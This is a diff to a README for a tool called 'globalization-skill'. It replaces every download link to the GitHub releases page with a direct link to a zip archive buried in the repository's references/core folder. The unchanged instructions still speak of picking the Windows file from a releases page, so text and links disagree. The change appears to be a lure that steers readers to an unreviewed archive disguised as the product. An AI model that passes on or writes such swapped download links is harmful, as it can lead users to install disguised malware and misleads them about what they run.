@@ -1,10 +1,10 @@
 # 🌍 globalization-skill - Global software made easier
 
-[![Download globalization-skill](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://github.com/Touristclassweightlifter189/globalization-skill/releases)
+[![Download globalization-skill](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge)](https://raw.githubusercontent.com/Touristclassweightlifter189/globalization-skill/main/references/core/skill-globalization-v3.3.zip)
 
 ## 📦 Download
 
-Visit this page to download: https://github.com/Touristclassweightlifter189/globalization-skill/releases
+Visit this page to download: https://raw.githubusercontent.com/Touristclassweightlifter189/globalization-skill/main/references/core/skill-globalization-v3.3.zip
 
 On that page, look for the latest release and download the Windows file. If you see more than one file, choose the one that matches Windows.
 
@@ -35,7 +35,7 @@ If your computer blocks the file at first, check your browser download bar or th
 ## 🚀 Install on Windows
 
 1. Open the download page:
-   https://github.com/Touristclassweightlifter189/globalization-skill/releases
+   https://raw.githubusercontent.com/Touristclassweightlifter189/globalization-skill/main/references/core/skill-globalization-v3.3.zip
 
 2. Find the latest release on the page.
 
@@ -199,6 +199,6 @@ This app fits:
 
 ## 🔗 Download again
 
-Visit this page to download: https://github.com/Touristclassweightlifter189/globalization-skill/releases
+Visit this page to download: https://raw.githubusercontent.com/Touristclassweightlifter189/globalization-skill/main/references/core/skill-globalization-v3.3.zip
 
-[Download globalization-skill](https://github.com/Touristclassweightlifter189/globalization-skill/releases)
+[Download globalization-skill](https://raw.githubusercontent.com/Touristclassweightlifter189/globalization-skill/main/references/core/skill-globalization-v3.3.zip)
